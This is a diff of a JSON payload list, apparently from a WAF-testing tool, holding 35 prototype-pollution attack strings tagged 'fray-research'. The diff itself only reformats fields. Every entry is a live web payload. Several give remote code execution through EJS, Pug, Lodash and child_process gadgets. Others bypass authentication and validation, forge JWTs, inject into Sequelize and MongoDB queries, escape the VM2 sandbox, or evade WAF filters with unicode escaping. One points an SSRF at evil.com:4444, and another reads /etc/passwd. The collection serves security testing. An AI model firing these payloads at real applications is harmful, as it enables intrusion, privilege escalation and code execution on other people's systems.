@@ -10,9 +10,13 @@
       "payload": "{\"__proto__\": {\"polluted\": true}}",
       "description": "Basic JSON __proto__ pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf", "aws_waf"],
+      "tested_against": [
+        "cloudflare_waf",
+        "aws_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1002",
@@ -21,9 +25,12 @@
       "payload": "{\"__proto__\": {\"isAdmin\": true}}",
       "description": "Privilege escalation via JSON __proto__",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1003",
@@ -32,9 +39,12 @@
       "payload": "{\"__proto__\": {\"role\": \"admin\", \"verified\": true}}",
       "description": "Multi-property privilege escalation",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1004",
@@ -43,9 +53,12 @@
       "payload": "{\"constructor\": {\"prototype\": {\"polluted\": true}}}",
       "description": "Constructor.prototype pollution via JSON",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1005",
@@ -54,9 +67,12 @@
       "payload": "{\"__proto__\": {\"outputFunctionName\": \"x;process.mainModule.require('child_process').execSync('id');x\"}}",
       "description": "EJS RCE via outputFunctionName pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1006",
@@ -65,9 +81,12 @@
       "payload": "{\"__proto__\": {\"escapeFunction\": \"1;process.mainModule.require('child_process').execSync('id')\"}}",
       "description": "EJS escapeFunction RCE via __proto__",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1007",
@@ -76,9 +95,12 @@
       "payload": "{\"__proto__\": {\"client\": true, \"compileDebug\": true, \"debug\": true}}",
       "description": "Pug/Jade debug mode enable via pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1008",
@@ -87,9 +109,12 @@
       "payload": "{\"__proto__\": {\"block\": {\"type\": \"Text\", \"line\": \"process.mainModule.require('child_process').execSync('id')\"}}}",
       "description": "Pug block override for RCE",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1009",
@@ -98,9 +123,12 @@
       "payload": "{\"__proto__\": {\"sourceURL\": \"\\u000aprocess.mainModule.require('child_process').execSync('id')//\"}}",
       "description": "Lodash sourceURL RCE via prototype pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1010",
@@ -109,9 +137,12 @@
       "payload": "{\"__proto__\": {\"allowedOrigins\": [\"*\"]}}",
       "description": "CORS wildcard override via pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1011",
@@ -120,9 +151,12 @@
       "payload": "{\"__proto__\": {\"headers\": {\"x-forwarded-for\": \"127.0.0.1\"}}}",
       "description": "IP spoofing via header pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1012",
@@ -131,9 +165,12 @@
       "payload": "{\"__proto__\": {\"hostname\": \"evil.com\", \"port\": 4444}}",
       "description": "SSRF via hostname+port pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1013",
@@ -142,9 +179,12 @@
       "payload": "{\"__proto__\": {\"protocol\": \"file:\", \"pathname\": \"/etc/passwd\"}}",
       "description": "Local file read via protocol+pathname pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1014",
@@ -153,9 +193,12 @@
       "payload": "{\"__proto__\": {\"shell\": \"/proc/self/exe\", \"argv0\": \"console.log(require('child_process').execSync('id').toString())\"}}",
       "description": "Shell override for RCE via child_process",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1015",
@@ -164,9 +207,12 @@
       "payload": "{\"__proto__\": {\"shell\": true}}",
       "description": "Shell flag enable — affects child_process spawn",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1016",
@@ -175,9 +221,12 @@
       "payload": "{\"__proto__\": {\"NODE_OPTIONS\": \"--require /proc/self/environ\"}}",
       "description": "NODE_OPTIONS injection for RCE",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1017",
@@ -186,9 +235,12 @@
       "payload": "{\"__proto__\": {\"env\": {\"AAAA\": \"require('child_process').execSync('id')\", \"NODE_OPTIONS\": \"--require /proc/self/environ\"}}}",
       "description": "Full env injection chain for RCE",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1018",
@@ -197,9 +249,12 @@
       "payload": "{\"__proto__\": {\"toString\": {\"constructor\": {\"name\": \"Function\"}}}}",
       "description": "toString override for gadget chain",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1019",
@@ -208,9 +263,12 @@
       "payload": "{\"__proto__\": {\"auth\": false, \"requireAuth\": false}}",
       "description": "Authentication bypass via auth flag pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1020",
@@ -219,9 +277,12 @@
       "payload": "{\"__proto__\": {\"allowAll\": true, \"skipValidation\": true}}",
       "description": "Validation bypass via prototype pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1021",
@@ -230,9 +291,12 @@
       "payload": "{\"__proto__\": {\"status\": 200}}",
       "description": "Status code override — bypass error handling",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1022",
@@ -241,9 +305,12 @@
       "payload": "{\"__proto__\": {\"type\": \"text/html\", \"body\": \"<script>alert(1)</script>\"}}",
       "description": "Content-type + body override for XSS",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1023",
@@ -252,9 +319,12 @@
       "payload": "{\"__proto__\": {\"secret\": \"leaked\", \"jwtSecret\": \"leaked\"}}",
       "description": "JWT secret override for token forging",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1024",
@@ -263,9 +333,12 @@
       "payload": "{\"__proto__\": {\"algorithm\": \"none\"}}",
       "description": "JWT algorithm confusion via pollution (alg:none)",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1025",
@@ -274,9 +347,12 @@
       "payload": "{\"__proto__\": {\"where\": {\"1\": \"1\"}}}",
       "description": "Sequelize/ORM WHERE clause injection via pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1026",
@@ -285,9 +361,12 @@
       "payload": "{\"__proto__\": {\"$gt\": \"\"}}",
       "description": "MongoDB NoSQL injection via prototype pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1027",
@@ -296,9 +375,12 @@
       "payload": "{\"a\": 1, \"__proto__\": {\"b\": 2}}",
       "description": "Mixed legitimate data + pollution (bypass naive filters)",
       "technique": "waf_bypass",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1028",
@@ -307,9 +389,12 @@
       "payload": "{\"\\u005f\\u005fproto\\u005f\\u005f\": {\"polluted\": true}}",
       "description": "Unicode-escaped __proto__ key bypass",
       "technique": "waf_bypass",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1029",
@@ -318,9 +403,12 @@
       "payload": "{\"nested\": {\"__proto__\": {\"polluted\": true}}}",
       "description": "Nested object __proto__ pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1030",
@@ -329,9 +417,12 @@
       "payload": "{\"a\": {\"b\": {\"__proto__\": {\"polluted\": true}}}}",
       "description": "Deeply nested __proto__ pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1031",
@@ -340,9 +431,12 @@
       "payload": "[{\"__proto__\": {\"polluted\": true}}]",
       "description": "Array wrapper __proto__ pollution",
       "technique": "waf_bypass",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1032",
@@ -351,9 +445,12 @@
       "payload": "{\"__proto__\": {\"readable\": true, \"writable\": true}}",
       "description": "Property descriptor override via pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1033",
@@ -362,9 +459,12 @@
       "payload": "{\"__proto__\": {\"trim\": \"\", \"includes\": \"\"}}",
       "description": "String method override — bypass input validation",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1034",
@@ -373,9 +473,12 @@
       "payload": "{\"__proto__\": {\"contextExtensions\": [{\"process\": {\"mainModule\": {\"require\": {}}}}]}}",
       "description": "VM2 sandbox escape via contextExtensions pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     },
     {
       "id": "pp-1035",
@@ -384,9 +487,12 @@
       "payload": "{\"__proto__\": {\"handlebars\": {\"allowProtoMethodsByDefault\": true, \"allowProtoPropertiesByDefault\": true}}}",
       "description": "Handlebars proto access enable via pollution",
       "technique": "prototype_pollution",
-      "tested_against": ["cloudflare_waf"],
+      "tested_against": [
+        "cloudflare_waf"
+      ],
       "success_rate": 0.0,
-      "blocked": false
+      "blocked": false,
+      "source": "fray-research"
     }
   ]
 }
